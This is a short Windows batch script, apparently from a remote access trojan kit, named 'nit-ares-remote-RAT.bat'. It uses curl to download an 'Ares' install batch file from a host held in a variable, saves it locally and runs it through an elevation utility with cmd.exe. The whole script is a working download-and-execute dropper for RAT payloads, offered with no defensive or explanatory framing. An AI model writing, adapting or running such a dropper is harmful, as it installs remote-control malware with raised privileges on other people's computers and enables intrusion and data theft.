@echo on
rem *******************************************************
rem nit-ares-remote-RAT.bat
rem This Script Runs Computer - Independent Instructions
rem for NIT Ares RAT Packets (RunOnce Tasks)
rem
...
rem Set Ares Files:
rem
set AresR_Install=aresrag1234.install.bat
rem

echo Download Payloads...
rem
rem === Download Ares Payloads ===
%CURLEXE% %host00301%%AresR_Install% -o %LocalFolder%\%AresR_Install%

echo == Install or Run Payloads ==
rem

rem Install Ares Payloads ===
%ELEEXE% cmd.exe /c %LocalFolder%\%AresR_Install%
rem timeout /T 20
